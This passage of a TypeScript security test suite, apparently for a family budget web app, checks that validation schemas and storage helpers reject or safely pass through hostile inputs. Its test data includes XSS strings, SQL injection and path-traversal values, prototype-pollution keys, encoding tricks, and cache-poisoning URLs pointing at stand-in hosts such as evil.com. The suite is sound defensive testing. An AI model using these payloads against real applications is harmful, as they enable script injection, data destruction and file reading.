    it('should strip foreign key manipulation attempts', () => {
      const attackPayload = {
        month_id: 'month-123',
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
        ...MASS_ASSIGNMENT_PAYLOADS.foreignKeyManipulation,
      };

      const result = CreateExpenseInputSchema.safeParse(attackPayload);
      
      expect(result.success).toBe(true);
      // family_id and owner_id should be stripped
      expect((result.data as Record<string, unknown>).family_id).toBeUndefined();
      expect((result.data as Record<string, unknown>).owner_id).toBeUndefined();
    });
  });

  describe('DB Row schemas MUST strip extra fields', () => {
    it('should strip admin field from expense row', () => {
      const maliciousRow = {
        id: 'exp-123',
        month_id: 'month-456',
        title: 'Test',
        category_key: 'essenciais',
        subcategory_id: null,
        value: 100,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
        isAdmin: true, // Attack vector
        role: 'superuser', // Attack vector
      };

      const result = ExpenseRowSchema.safeParse(maliciousRow);
      
      // Parsing MUST succeed
      expect(result.success).toBe(true);
      // Attack fields MUST be stripped
      expect((result.data as Record<string, unknown>).isAdmin).toBeUndefined();
      expect((result.data as Record<string, unknown>).role).toBeUndefined();
    });
  });
});

describe('Security - Buffer Overflow Patterns', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('handles extremely long inputs', () => {
    it.each(BUFFER_OVERFLOW_PAYLOADS)('should handle long payload safely', (payload) => {
      // Should not crash
      expect(() => {
        setSecureStorageItem('current-family-id', payload);
      }).not.toThrow();

      // Should be rejected due to pattern mismatch or reserved chars
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('protects against format string attacks', () => {
    const formatStringPayloads = ['%s%s%s%s', '%n%n%n%n', '%x%x%x%x', '%d%d%d%d'];

    it.each(formatStringPayloads)('should reject format string: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - Polyglot Payload Prevention', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  describe('rejects polyglot XSS payloads in IDs', () => {
    it.each(POLYGLOT_PAYLOADS)('should reject polyglot: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });

  describe('handles polyglots in text fields', () => {
    it.each(POLYGLOT_PAYLOADS)('should accept polyglot in title (React escapes on render)', (payload) => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: payload.substring(0, 255),
        category_key: 'essenciais',
        value: 100,
      });
      // Zod validates structure, React escapes XSS on render - this is the correct behavior
      expect(result.success).toBe(true);
    });
  });
});

describe('Security - Time-Based Attack Prevention', () => {
  describe('validates operations complete in reasonable time', () => {
    it('should validate expense quickly', () => {
      const startTime = Date.now();
      
      for (let i = 0; i < 1000; i++) {
        CreateExpenseInputSchema.safeParse({
          month_id: 'month-123',
          title: 'Test Expense',
          category_key: 'essenciais',
          value: 100,
        });
      }
      
      const elapsed = Date.now() - startTime;
      // 1000 validations should complete in under 1 second
      expect(elapsed).toBeLessThan(1000);
    });

    it('should handle storage operations quickly', () => {
      const startTime = Date.now();
      
      for (let i = 0; i < 100; i++) {
        setSecureStorageItem('budget-app-theme', 'dark');
        getSecureStorageItem('budget-app-theme');
      }
      
      const elapsed = Date.now() - startTime;
      // 100 storage operations should complete in under 100ms
      expect(elapsed).toBeLessThan(100);
    });
  });
});

describe('Security - Encoding Attack Variations', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  const encodingAttacks = [
    // Double encoding
    '%252e%252e%252f',
    '%25%32%65%25%32%65%25%32%66',
    // Mixed encoding
    '%2e.%2f',
    '..%c0%af',
    '..%c1%9c',
    // Overlong UTF-8
    '%c0%ae%c0%ae/',
    // Unicode normalization attacks
    '\uFF1Cscript\uFF1E', // Fullwidth < and >
    '\u003Cscript\u003E', // Standard Unicode
    // Null byte variations
    '%00',
    '\x00',
    '\u0000',
  ];

  describe('rejects encoding attacks in IDs', () => {
    it.each(encodingAttacks)('should reject encoded attack: %s', (payload) => {
      expect(setSecureStorageItem('current-family-id', payload)).toBe(false);
    });
  });
});

describe('Security - Business Logic Attacks', () => {
  describe('prevents negative balance manipulation', () => {
    it('should reject negative income values', () => {
      const result = CreateIncomeSourceInputSchema.safeParse({
        name: 'Salary',
        value: -10000,
      });
      expect(result.success).toBe(false);
    });

    it('should reject negative expense values', () => {
      const result = CreateExpenseInputSchema.safeParse({
        month_id: 'month-123',
        title: 'Refund Hack',
        category_key: 'essenciais',
        value: -500,
      });
      expect(result.success).toBe(false);
    });

    it('should reject negative goal targets', () => {
      const result = CreateGoalInputSchema.safeParse({
        family_id: 'fam-123',
        name: 'Negative Goal',
        target_value: -1000,
      });
      expect(result.success).toBe(false);
    });
  });

  describe('prevents date manipulation attacks', () => {
    it('should reject year far in the past', () => {
      const result = MonthRowSchema.safeParse({
        id: 'month-123',
        family_id: 'fam-456',
        year: 1900,
        month: 1,
        income: 0,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      });
      expect(result.success).toBe(false);
    });

    it('should reject year far in the future', () => {
      const result = MonthRowSchema.safeParse({
        id: 'month-123',
        family_id: 'fam-456',
        year: 2200,
        month: 1,
        income: 0,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      });
      expect(result.success).toBe(false);
    });

    it('should reject invalid month (13)', () => {
      const result = MonthRowSchema.safeParse({
        id: 'month-123',
        family_id: 'fam-456',
        year: 2025,
        month: 13,
        income: 0,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      });
      expect(result.success).toBe(false);
    });

    it('should reject invalid month (0)', () => {
      const result = MonthRowSchema.safeParse({
        id: 'month-123',
        family_id: 'fam-456',
        year: 2025,
        month: 0,
        income: 0,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      });
      expect(result.success).toBe(false);
    });
  });

  describe('prevents installment manipulation', () => {
    it('should reject zero installments', () => {
      const result = CreateRecurringExpenseInputSchema.safeParse({
        title: 'TV',
        category_key: 'conforto',
        value: 100,
        has_installments: true,
        total_installments: 0,
      });
      expect(result.success).toBe(false);
    });

    it('should reject negative installments', () => {
      const result = CreateRecurringExpenseInputSchema.safeParse({
        title: 'TV',
        category_key: 'conforto',
        value: 100,
        has_installments: true,
        total_installments: -5,
      });
      expect(result.success).toBe(false);
    });
  });
});

describe('Security - ID Format Validation', () => {
  beforeEach(() => {
    localStorage.clear();
  });

  const validIdFormats = [
    'abc123',
    'a1b2c3d4',
    'UUID-like-format',
    'family_123_test',
    'UPPERCASE-id',
    'mixed-Case_123',
  ];

  const invalidIdFormats = [
    '',
    ' ',
    '   ',
    'id with spaces',
    'id\twith\ttabs',
    'id\nwith\nnewlines',
    'id;with;semicolons',
    'id&with&ampersands',
    'id?with?questions',
    'id=with=equals',
    'id+with+plus',
  ];

  describe('accepts valid ID formats', () => {
    it.each(validIdFormats)('should accept: %s', (id) => {
      expect(setSecureStorageItem('current-family-id', id)).toBe(true);
    });
  });

  describe('rejects invalid ID formats', () => {
    it.each(invalidIdFormats)('should reject: %s', (id) => {
      expect(setSecureStorageItem('current-family-id', id)).toBe(false);
    });
  });
});

// ============================================================================
// NEW: Mapper Security Tests (Data from Database)
// ============================================================================

describe('Security - Mapper Handling of Malicious Database Data', () => {
  describe('mapExpense handles malicious data safely', () => {
    it('should handle XSS in title from database', () => {
      const maliciousExpense = {
        id: 'exp-123',
        month_id: 'month-456',
        family_id: 'fam-789',
        title: '<script>alert("xss")</script>',
        category_key: 'essenciais',
        subcategory_id: null,
        value: 100,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      };

      // Mapper should pass through - React handles escaping at render time
      const result = mapExpense(maliciousExpense);
      expect(result.title).toBe('<script>alert("xss")</script>');
      // The key is React will escape this when rendering
    });

    it('should handle SQL injection in title from database', () => {
      const maliciousExpense = {
        id: 'exp-123',
        month_id: 'month-456',
        family_id: 'fam-789',
        title: "'; DROP TABLE expenses; --",
        category_key: 'essenciais',
        subcategory_id: null,
        value: 100,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      };

      const result = mapExpense(maliciousExpense);
      // Just a string, no execution
      expect(result.title).toBe("'; DROP TABLE expenses; --");
    });

    it('should handle malformed month_id without crashing', () => {
      const maliciousExpense = {
        id: 'exp-123',
        month_id: '../../../etc/passwd',
        family_id: 'fam-789',
        title: 'Test',
        category_key: 'essenciais',
        subcategory_id: null,
        value: 100,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      };

      // Should not crash, just won't extract valid month/year
      expect(() => mapExpense(maliciousExpense)).not.toThrow();
    });

    it('should handle null bytes in strings', () => {
      const maliciousExpense = {
        id: 'exp-123',
        month_id: 'month-456',
        family_id: 'fam-789',
        title: 'Test\x00Injection',
        category_key: 'essenciais',
        subcategory_id: null,
        value: 100,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      };

      expect(() => mapExpense(maliciousExpense)).not.toThrow();
    });

    it('should handle extremely large values', () => {
      const maliciousExpense = {
        id: 'exp-123',
        month_id: 'month-456',
        family_id: 'fam-789',
        title: 'Test',
        category_key: 'essenciais',
        subcategory_id: null,
        value: Number.MAX_SAFE_INTEGER,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      };

      const result = mapExpense(maliciousExpense);
      expect(result.value).toBe(Number.MAX_SAFE_INTEGER);
    });

    it('should handle Unicode in category_key attempt', () => {
      const maliciousExpense = {
        id: 'exp-123',
        month_id: 'month-456',
        family_id: 'fam-789',
        title: 'Test',
        category_key: 'essenci\u0000ais', // Null byte in category
        subcategory_id: null,
        value: 100,
        is_recurring: false,
        is_pending: false,
        due_day: null,
        recurring_expense_id: null,
        installment_current: null,
        installment_total: null,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      };

      // Mapper passes through, Zod validation would catch invalid category
      expect(() => mapExpense(maliciousExpense)).not.toThrow();
    });
  });

  describe('mapGoal handles malicious data safely', () => {
    it('should handle XSS in goal name', () => {
      const maliciousGoal = {
        id: 'goal-123',
        family_id: 'fam-456',
        name: '<img src=x onerror=alert(1)>',
        target_value: 10000,
        target_month: 12,
        target_year: 2025,
        account: null,
        linked_subcategory_id: null,
        linked_category_key: null,
        status: 'active' as const,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      };

      const result = mapGoal(maliciousGoal);
      // React will escape this
      expect(result.name).toBe('<img src=x onerror=alert(1)>');
    });

    it('should handle template injection in account field', () => {
      const maliciousGoal = {
        id: 'goal-123',
        family_id: 'fam-456',
        name: 'Savings',
        target_value: 10000,
        target_month: null,
        target_year: null,
        account: '{{constructor.constructor("alert(1)")()}}',
        linked_subcategory_id: null,
        linked_category_key: null,
        status: 'active' as const,
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      };

      const result = mapGoal(maliciousGoal);
      expect(result.account).toBe('{{constructor.constructor("alert(1)")()}}');
    });
  });

  describe('mapSubcategory handles malicious data safely', () => {
    it('should handle XSS in subcategory name', () => {
      const result = mapSubcategory({
        id: 'sub-123',
        family_id: 'fam-456',
        name: '<script>document.cookie</script>',
        category_key: 'essenciais',
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      });

      expect(result.name).toBe('<script>document.cookie</script>');
    });

    it('should handle prototype pollution attempt in category_key', () => {
      const result = mapSubcategory({
        id: 'sub-123',
        family_id: 'fam-456',
        name: 'Test',
        category_key: '__proto__',
        created_at: '2025-01-01T00:00:00Z',
        updated_at: '2025-01-01T00:00:00Z',
      });

      // Just a string, not actual prototype pollution
      expect(result.categoryKey).toBe('__proto__');
    });
  });
});

// ============================================================================
// NEW: Goal Entry Security Tests
// ============================================================================

describe('Security - Goal Entry Validation', () => {
  describe('CreateGoalEntryInputSchema security', () => {
    it('should reject extremely large values', () => {
      const result = CreateGoalEntryInputSchema.safeParse({
        goal_id: 'goal-123',
        expense_id: 'exp-456',
        value: Number.MAX_VALUE,
        month: 1,
        year: 2025,
      });
      // MAX_VALUE exceeds safe financial limits and must be rejected
      expect(result.success).toBe(false);
    });

    it('should reject Infinity value', () => {
      const result = CreateGoalEntryInputSchema.safeParse({
        goal_id: 'goal-123',
        expense_id: 'exp-456',
        value: Infinity,
        month: 1,
        year: 2025,
      });
      // Infinity is not a valid financial value
      expect(result.success).toBe(false);
    });

    it('should handle XSS in description', () => {
      const result = CreateGoalEntryInputSchema.safeParse({
        goal_id: 'goal-123',
        expense_id: 'exp-456',
        value: 100,
        description: '<script>alert(1)</script>',
        month: 1,
        year: 2025,
      });
      // Description is optional string - XSS is handled by React escaping
      expect(result.success).toBe(true);
    });
  });

  describe('CreateManualGoalEntryInputSchema security', () => {
    it('should allow negative values for withdrawals', () => {
      const result = CreateManualGoalEntryInputSchema.safeParse({
        goal_id: 'goal-123',
        value: -500,
        description: 'Emergency withdrawal',
        month: 1,
        year: 2025,
      });
      // Manual entries can be negative (corrections, withdrawals)
      expect(result.success).toBe(true);
    });

    it('should require description for manual entries', () => {
      const result = CreateManualGoalEntryInputSchema.safeParse({
        goal_id: 'goal-123',
        value: 100,
        month: 1,
        year: 2025,
      });
      // Description is required for manual entries
      expect(result.success).toBe(false);
    });

    it('should reject invalid month in entry', () => {
      const result = CreateManualGoalEntryInputSchema.safeParse({
        goal_id: 'goal-123',
        value: 100,
        description: 'Test',
        month: 13, // Invalid month
        year: 2025,
      });
      // Month must be 1-12
      expect(result.success).toBe(false);
    });
  });
});

// ============================================================================
// NEW: Subcategory Security Tests
// ============================================================================

describe('Security - Subcategory Validation', () => {
  describe('CreateSubcategoryInputSchema security', () => {
    it('should accept valid subcategory', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: 'Groceries',
        category_key: 'essenciais',
      });
      expect(result.success).toBe(true);
    });

    it('should reject empty name', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: '',
        category_key: 'essenciais',
      });
      expect(result.success).toBe(false);
    });

    it('should reject name exceeding max length', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: 'A'.repeat(256),
        category_key: 'essenciais',
      });
      expect(result.success).toBe(false);
    });

    it('should reject invalid category_key', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: 'Test',
        category_key: 'admin',
      });
      expect(result.success).toBe(false);
    });

    it('should handle XSS in name (React escapes)', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: '<script>alert(1)</script>',
        category_key: 'conforto',
      });
      // Accepted as string, React escapes on render
      expect(result.success).toBe(true);
    });

    it('should handle SQL injection in name (parameterized queries)', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: "'; DELETE FROM subcategories; --",
        category_key: 'metas',
      });
      // Accepted as string, Supabase uses parameterized queries
      expect(result.success).toBe(true);
    });

    it('should reject prototype pollution as category_key', () => {
      const result = CreateSubcategoryInputSchema.safeParse({
        name: 'Test',
        category_key: '__proto__',
      });
      expect(result.success).toBe(false);
    });
  });
});

// ============================================================================
// NEW: Currency Formatter Security Tests
// ============================================================================

describe('Security - Currency Formatter Attack Resistance', () => {
  describe('sanitizeCurrencyInput advanced attacks', () => {
    it('should handle ReDoS attempt', () => {
      const startTime = Date.now();
      const payload = '1'.repeat(10000) + ',00';
      
      sanitizeCurrencyInput(payload);
      
      const elapsed = Date.now() - startTime;
      expect(elapsed).toBeLessThan(100);
    });

    it('should handle Unicode number lookalikes', () => {
      // Fullwidth digits
      const result = sanitizeCurrencyInput('\uFF11\uFF10\uFF10'); // １００ fullwidth
      expect(result).toBe(''); // Stripped as non-numeric
    });

    it('should handle mixed encoding attacks', () => {
      const result = sanitizeCurrencyInput('1%302%30.00'); // URL encoded zeros
      expect(result).not.toContain('%');
    });

    it('should handle null byte injection', () => {
      const result = sanitizeCurrencyInput('100\x0050');
      expect(result).toBe('10050');
    });
  });

  describe('parseCurrencyInput edge cases', () => {
    it('should return 0 for Infinity string', () => {
      const result = parseCurrencyInput('Infinity');
      expect(result).toBe(0);
    });

    it('should return 0 for -Infinity string', () => {
      const result = parseCurrencyInput('-Infinity');
      expect(result).toBe(0);
    });

    it('should return 0 for NaN string', () => {
      const result = parseCurrencyInput('NaN');
      expect(result).toBe(0);
    });

    it('should handle scientific notation safely', () => {
      const result = parseCurrencyInput('1e10');
      // Scientific notation should be handled but result must be finite
      expect(Number.isFinite(result)).toBe(true);
    });

    it('should handle negative zero', () => {
      const result = parseCurrencyInput('-0');
      expect(Object.is(result, 0) || Object.is(result, -0)).toBe(true);
    });
  });
});

// ============================================================================
// NEW: Offline Adapter Security Tests
// ============================================================================

describe('Security - Offline Storage Attack Resistance', () => {
  describe('IndexedDB data integrity via Zod validation', () => {
    it('should reject expense with script injection when validated', () => {
      // Even if malicious data reaches IndexedDB, Zod validation on READ should catch issues
      const maliciousExpense = {
        month_id: '', // Invalid: empty
        title: '<script>alert(1)</script>',
        category_key: 'invalid_category', // Invalid: not in enum
        value: 'not-a-number', // Invalid: wrong type
      };

      const result = CreateExpenseInputSchema.safeParse(maliciousExpense);
      
      // MUST fail validation
      expect(result.success).toBe(false);
      expect(result.error?.issues.length).toBeGreaterThanOrEqual(3);
    });

    it('should reject data with prototype pollution keys via schema', () => {
      const pollutedData = {
        month_id: '__proto__',
        title: 'constructor',
        category_key: 'essenciais',
        value: 100,
      };

      // This parses successfully BUT the values are just strings
      const result = CreateExpenseInputSchema.safeParse(pollutedData);
      expect(result.success).toBe(true);
      
      // Verify no prototype pollution occurred
      expect(({} as Record<string, unknown>).month_id).toBeUndefined();
      expect(Object.prototype.hasOwnProperty.call(Object.prototype, 'title')).toBe(false);
    });

    it('should enforce max ID length via secureStorage', () => {
      const largeId = 'a'.repeat(10000);
      
      // secureStorage MUST reject extremely large IDs
      const result = setSecureStorageItem('current-family-id', largeId);
      expect(result).toBe(false);
    });

    it('should validate offline ID format strictly', () => {
      // Valid offline IDs
      const validIds = [
        'offline-1704067200000-abc123',
        'exp-1704067200000-def456',
      ];
      
      // Malicious offline IDs
      const maliciousIds = [
        'offline-<script>-alert',
        '__proto__-1234-abc',
        'offline-NaN-test',
      ];

      const offlineIdPattern = /^(offline|family|exp|month|goal|rec|sub|gentry)-\d+-[a-z0-9]+$/;

      validIds.forEach(id => {
        expect(offlineIdPattern.test(id)).toBe(true);
      });

      maliciousIds.forEach(id => {
        expect(offlineIdPattern.test(id)).toBe(false);
      });
    });
  });
});

// ============================================================================
// NEW: Month Limits Security Tests
// ============================================================================

describe('Security - Month Limits Manipulation Prevention', () => {
  describe('MonthLimitsSchema security', () => {
    it('should reject percentage over 100', () => {
      const result = MonthLimitsSchema.safeParse({
        essenciais: 150,
      });
      expect(result.success).toBe(false);
    });

    it('should reject negative percentage', () => {
      const result = MonthLimitsSchema.safeParse({
        essenciais: -10,
      });
      expect(result.success).toBe(false);
    });

    it('should reject invalid category key', () => {
      const result = MonthLimitsSchema.safeParse({
        'invalid-category': 50,
      });
      expect(result.success).toBe(false);
    });

    it('should reject prototype pollution key __proto__', () => {
      const attackPayload = Object.fromEntries([['__proto__', 50]]);
      const result = MonthLimitsSchema.safeParse(attackPayload);
      expect(result.success).toBe(false);
    });

    it('should reject prototype pollution key via defineProperty', () => {
      // Object literal { '__proto__': 50 } doesn't create a key in JavaScript
      // Use Object.defineProperty to actually create the key
      const attackPayload: Record<string, number> = {};
      Object.defineProperty(attackPayload, '__proto__', {
        value: 50,
        enumerable: true,
        writable: true,
        configurable: true,
      });
      const result = MonthLimitsSchema.safeParse(attackPayload);
      expect(result.success).toBe(false);
    });

    it('should reject constructor key', () => {
      const result = MonthLimitsSchema.safeParse({
        constructor: 50,
      });
      expect(result.success).toBe(false);
    });

    it('should reject prototype key', () => {
      const result = MonthLimitsSchema.safeParse({
        prototype: 50,
      });
      expect(result.success).toBe(false);
    });

    it('should accept valid limits', () => {
      const result = MonthLimitsSchema.safeParse({
        essenciais: 50,
        conforto: 30,
        metas: 20,
      });
      expect(result.success).toBe(true);
    });
  });
});

// ============================================================================
// NEW: Recurring Expense Security Tests
// ============================================================================

describe('Security - Recurring Expense Validation', () => {
  describe('CreateRecurringExpenseInputSchema security', () => {
    it('should reject extremely large installment count', () => {
      const result = CreateRecurringExpenseInputSchema.safeParse({
        title: 'TV',
        category_key: 'conforto',
        value: 100,
        has_installments: true,
        total_installments: 999999999,
      });
      // Installments must have a reasonable maximum (120 = 10 years)
      expect(result.success).toBe(false);
    });

    it('should reject fractional installments', () => {
      const result = CreateRecurringExpenseInputSchema.safeParse({
        title: 'TV',
        category_key: 'conforto',
        value: 100,
        has_installments: true,
        total_installments: 12.5,
      });
      // Must be integer
      expect(result.success).toBe(false);
    });

    it('should handle XSS in title', () => {
      const result = CreateRecurringExpenseInputSchema.safeParse({
        title: '<img src=x onerror=alert(1)>',
        category_key: 'prazeres',
        value: 50,
      });
      // React escapes on render
      expect(result.success).toBe(true);
    });

    it('should reject value as string', () => {
      const result = CreateRecurringExpenseInputSchema.safeParse({
        title: 'Netflix',
        category_key: 'prazeres',
        value: '50' as unknown,
      });
      expect(result.success).toBe(false);
    });
  });
});

// ============================================================================
// NEW: Race Condition Awareness Tests
// ============================================================================

describe('Security - Concurrency Safety', () => {
  describe('validates data integrity under rapid operations', () => {
    it('should handle rapid localStorage writes', () => {
      const results: boolean[] = [];
      
      for (let i = 0; i < 100; i++) {
        results.push(setSecureStorageItem('budget-app-theme', i % 2 === 0 ? 'dark' : 'light'));
      }
      
      // All should succeed
      expect(results.every(r => r === true)).toBe(true);
      
      // Final value should be consistent
      const finalValue = getSecureStorageItem('budget-app-theme');
      expect(['dark', 'light']).toContain(finalValue);
    });

    it('should handle rapid validation calls', async () => {
      const promises = Array(100).fill(null).map((_, i) => 
        Promise.resolve(CreateExpenseInputSchema.safeParse({
          month_id: `month-${i}`,
          title: `Expense ${i}`,
          category_key: 'essenciais',
          value: i * 10,
        }))
      );

      const results = await Promise.all(promises);
      expect(results.every(r => r.success === true)).toBe(true);
    });
  });
});

// ============================================================================
// NEW: Input Sanitization Completeness
// ============================================================================

describe('Security - Comprehensive Input Sanitization', () => {
  describe('Zod schemas MUST strip extra fields (mass assignment prevention)', () => {
    const schemas = [
      { name: 'CreateExpenseInputSchema', schema: CreateExpenseInputSchema, 
        valid: { month_id: 'm-1', title: 'T', category_key: 'essenciais', value: 1 },
        expectedKeys: ['month_id', 'title', 'category_key', 'value'] },
      { name: 'CreateGoalInputSchema', schema: CreateGoalInputSchema,
        valid: { family_id: 'f-1', name: 'G', target_value: 100 },
        expectedKeys: ['family_id', 'name', 'target_value', 'status'] }, // status has default='active'
      { name: 'CreateIncomeSourceInputSchema', schema: CreateIncomeSourceInputSchema,
        valid: { name: 'Salary', value: 5000 },
        expectedKeys: ['name', 'value'] },
    ];

    it.each(schemas)('$name MUST strip extra isAdmin and role fields', ({ schema, valid, expectedKeys }) => {
      const attackPayload = {
        ...valid,
        isAdmin: true,
        role: 'admin',
        __internal: true,
        permissions: ['*'],
      };

      const result = schema.safeParse(attackPayload);
      
      // Parsing MUST succeed
      expect(result.success).toBe(true);
      
      // Attack fields MUST be stripped
      const data = result.data as Record<string, unknown>;
      expect(data.isAdmin).toBeUndefined();
      expect(data.role).toBeUndefined();
      expect(data.__internal).toBeUndefined();
      expect(data.permissions).toBeUndefined();
      
      // Only expected fields should remain
      expect(Object.keys(data).sort()).toEqual(expectedKeys.sort());
    });
  });

  describe('Prototype pollution prevention', () => {
    it('should NEVER pollute Object.prototype via __proto__ in input', () => {
      // Verify clean state first
      expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
      expect(({} as Record<string, unknown>).polluted).toBeUndefined();
      
      const malicious = Object.fromEntries([
        ['month_id', 'm-1'],
        ['title', 'Test'],
        ['category_key', 'essenciais'],
        ['value', 100],
        ['__proto__', { isAdmin: true, polluted: true }],
      ]);

      const result = CreateExpenseInputSchema.safeParse(malicious);
      
      // Parsing should succeed (Zod strips unknown keys)
      expect(result.success).toBe(true);
      
      // Object.prototype MUST NOT be polluted
      expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
      expect(({} as Record<string, unknown>).polluted).toBeUndefined();
      
      // New objects MUST NOT have polluted properties
      const freshObject: Record<string, unknown> = {};
      expect(freshObject.isAdmin).toBeUndefined();
    });

    it('should NEVER include __proto__ key in parsed result', () => {
      const malicious = Object.fromEntries([
        ['month_id', 'm-1'],
        ['title', 'Test'],
        ['category_key', 'essenciais'],
        ['value', 100],
        ['__proto__', { isAdmin: true }],
      ]);

      const result = CreateExpenseInputSchema.safeParse(malicious);
      
      // Parsing MUST succeed
      expect(result.success).toBe(true);
      
      // __proto__ MUST NOT be in the parsed data
      const parsedData = result.data as Record<string, unknown>;
      expect(Object.keys(parsedData)).not.toContain('__proto__');
      expect(Object.getOwnPropertyNames(parsedData)).not.toContain('__proto__');
    });

    it('should not pollute via constructor.prototype attack', () => {
      const malicious = {
        month_id: 'm-1',
        title: 'Test',
        category_key: 'essenciais',
        value: 100,
        constructor: { prototype: { isAdmin: true } },
      };

      CreateExpenseInputSchema.safeParse(malicious);
      
      // Object.prototype MUST NOT be polluted
      expect(({} as Record<string, unknown>).isAdmin).toBeUndefined();
    });
  });
});

// ============================================================================
// PWA Security Tests
// ============================================================================

/**
 * PWA-Specific Security Tests
 * 
 * Attack categories covered:
 * - Service Worker Cache Poisoning
 * - IndexedDB Data Integrity
 * - Offline ID Manipulation
 * - Sync Queue Injection
 * - Storage Quota Abuse
 * - Origin Validation
 */

// PWA-specific attack payloads
const _PWA_ATTACK_PAYLOADS = {
  // Malicious URLs for cache poisoning
  cachePoison: [
    'javascript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    '//evil.com/malware.js',
    'https://evil.com/fake-api',
    'file:///etc/passwd',
    'blob:https://evil.com/malicious',
  ],
  
  // Malicious manifest URLs
  manifestUrls: [
    'javascript:alert(document.cookie)',
    'data:application/json,{"malicious":true}',
    '//attacker.com/manifest.json',
    'file:///etc/hosts',
  ],
  
  // Sync queue manipulation
  syncQueueInjection: [
    { type: 'admin', action: 'escalate', data: { role: 'admin' } },
    { type: 'family', action: 'delete_all', data: {} },
    { type: '__proto__', action: 'pollute', data: { isAdmin: true } },
    { type: 'constructor', action: 'inject', data: {} },
  ],
};

describe('Security - PWA Service Worker Cache', () => {
  describe('Cache key validation - URL protocol detection', () => {
    it('should REJECT all dangerous URL protocols for cache names', () => {
      const dangerousProtocols = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'file:///etc/passwd',
        'blob:https://evil.com/malicious',
        'vbscript:msgbox(1)',
      ];

      const isDangerousUrl = (url: string): boolean => {
        const dangerousPrefixes = ['javascript:', 'data:', 'file:', 'blob:', 'vbscript:'];
        return dangerousPrefixes.some(prefix => url.toLowerCase().startsWith(prefix));
      };

      dangerousProtocols.forEach(url => {
        expect(isDangerousUrl(url)).toBe(true);
      });
    });

    it('should ACCEPT only safe relative and same-origin URLs', () => {
      const safeUrls = [
        '/api/data',
        './assets/icon.png',
        '../styles.css',
        'index.html',
      ];

      const isSafeUrl = (url: string): boolean => {
        // Safe URLs are relative paths, not absolute URLs with protocols
        return !url.includes(':') || url.startsWith('https://same-origin.com');
      };

      safeUrls.forEach(url => {
        expect(isSafeUrl(url)).toBe(true);
      });
    });

    it('should DETECT cross-origin URLs attempting cache poisoning', () => {
      const appOrigin = 'https://budget-app.com';
      const crossOriginUrls = [
        '//evil.com/malware.js',
        'https://evil.com/fake-api',
        'http://attacker.site/steal',
        'https://phishing.com/login.html',
      ];

      const isCrossOrigin = (url: string, origin: string): boolean => {
        if (url.startsWith('//')) return true; // Protocol-relative = cross-origin risk
        if (url.startsWith('http://') || url.startsWith('https://')) {
          return !url.startsWith(origin);
        }
        return false; // Relative URLs are same-origin
      };

      crossOriginUrls.forEach(url => {
        expect(isCrossOrigin(url, appOrigin)).toBe(true);
      });
    });
  });

  describe('Cache response type validation', () => {
    it('should REJECT opaque responses for critical resources', () => {
      // Opaque responses cannot be inspected - potential security risk
      const responseTypes = {
        safe: ['basic', 'cors'],
        unsafe: ['opaque', 'opaqueredirect'],
      };

      const isSafeResponseType = (type: string): boolean => {
        return responseTypes.safe.includes(type);
      };

      responseTypes.safe.forEach(type => {
        expect(isSafeResponseType(type)).toBe(true);
      });

      responseTypes.unsafe.forEach(type => {
        expect(isSafeResponseType(type)).toBe(false);
      });
    });
  });
});

describe('Security - PWA IndexedDB Integrity', () => {
  describe('Data validation on retrieval', () => {
    it('should REJECT malicious data via Zod validation', () => {
      // Simulates data that might have been tampered with in IndexedDB
      const tamperedData = {
        id: 'exp-123',
        month_id: '', // Empty - invalid
        title: '<script>alert(1)</script>',
        category_key: 'INVALID_CATEGORY', // Not in enum
        value: -999, // Negative - invalid
      };

      const result = CreateExpenseInputSchema.safeParse(tamperedData);
